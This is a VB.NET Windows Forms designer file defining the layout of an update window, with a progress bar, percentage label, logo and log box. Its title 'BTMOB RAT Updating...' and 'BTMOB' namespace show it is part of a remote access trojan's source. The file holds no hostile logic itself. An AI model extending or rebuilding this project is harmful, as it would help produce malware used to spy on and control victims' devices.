<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class updatewindow
    Inherits basestyle

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(updatewindow))
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.downprogress = New DrakeUI.Framework.DrakeUITrackBar()
        Me.countlabel = New System.Windows.Forms.Label()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.loglabel = New System.Windows.Forms.RichTextBox()
        Me.updateworker = New System.ComponentModel.BackgroundWorker()
        CType(Me.myscr, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.myico, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Panel2.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'pinbtn
        '
        Me.pinbtn.Location = New System.Drawing.Point(640, 5)
        '
        'minibtn
        '
        Me.minibtn.Location = New System.Drawing.Point(687, 5)
        '
        'closbtn
        '
        Me.closbtn.Location = New System.Drawing.Point(734, 5)
        '
        'myico
        '
        Me.myico.Image = CType(resources.GetObject("myico.Image"), System.Drawing.Image)
        '
        'mytitle
        '
        Me.mytitle.Size = New System.Drawing.Size(766, 18)
        Me.mytitle.Text = "BTMOB RAT Updating..."
        Me.mytitle.Visible = False
        '
        'Panel2
        '
        Me.Panel2.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Panel2.Controls.Add(Me.downprogress)
        Me.Panel2.Controls.Add(Me.countlabel)
        Me.Panel2.Controls.Add(Me.PictureBox1)
        Me.Panel2.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel2.Location = New System.Drawing.Point(2, 71)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Padding = New System.Windows.Forms.Padding(5)
        Me.Panel2.Size = New System.Drawing.Size(776, 77)
        Me.Panel2.TabIndex = 40
        '
        'downprogress
        '
        Me.downprogress.DisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.downprogress.Dock = System.Windows.Forms.DockStyle.Fill
        Me.downprogress.Enabled = False
        Me.downprogress.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.downprogress.Font = New System.Drawing.Font("Cascadia Code", 12.0!)
        Me.downprogress.ForeColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(136, Byte), Integer), CType(CType(229, Byte), Integer))
        Me.downprogress.Location = New System.Drawing.Point(74, 5)
        Me.downprogress.Name = "downprogress"
        Me.downprogress.RectColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.downprogress.Size = New System.Drawing.Size(637, 67)
        Me.downprogress.Style = DrakeUI.Framework.UIStyle.Custom
        Me.downprogress.TabIndex = 47
        '
        'countlabel
        '
        Me.countlabel.Dock = System.Windows.Forms.DockStyle.Left
        Me.countlabel.Font = New System.Drawing.Font("Cascadia Code", 10.0!, System.Drawing.FontStyle.Bold)
        Me.countlabel.Location = New System.Drawing.Point(5, 5)
        Me.countlabel.Name = "countlabel"
        Me.countlabel.Size = New System.Drawing.Size(69, 67)
        Me.countlabel.TabIndex = 48
        Me.countlabel.Text = "0%"
        Me.countlabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'PictureBox1
        '
        Me.PictureBox1.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.PictureBox1.Dock = System.Windows.Forms.DockStyle.Right
        Me.PictureBox1.Image = Global.BTMOB.My.Resources.Resources.logoup
        Me.PictureBox1.Location = New System.Drawing.Point(711, 5)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(60, 67)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.PictureBox1.TabIndex = 46
        Me.PictureBox1.TabStop = False
        '
        'loglabel
        '
        Me.loglabel.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.loglabel.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.loglabel.Dock = System.Windows.Forms.DockStyle.Fill
        Me.loglabel.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.loglabel.ForeColor = System.Drawing.SystemColors.Control
        Me.loglabel.Location = New System.Drawing.Point(2, 148)
        Me.loglabel.Name = "loglabel"
        Me.loglabel.ReadOnly = True
        Me.loglabel.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical
        Me.loglabel.Size = New System.Drawing.Size(776, 283)
        Me.loglabel.TabIndex = 41
        Me.loglabel.Text = ""
        '
        'updateworker
        '
        '
        'updatewindow
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(780, 433)
        Me.Controls.Add(Me.loglabel)
        Me.Controls.Add(Me.Panel2)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "updatewindow"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "BTMOB UPDATE"
        Me.TopMost = True
        Me.Controls.SetChildIndex(Me.Panel2, 0)
        Me.Controls.SetChildIndex(Me.loglabel, 0)
        CType(Me.myscr, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.myico, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Panel2.ResumeLayout(False)
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents Panel2 As Panel
    Friend WithEvents downprogress As DrakeUI.Framework.DrakeUITrackBar
    Friend WithEvents countlabel As Label
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents loglabel As RichTextBox
    Friend WithEvents updateworker As System.ComponentModel.BackgroundWorker
End Class
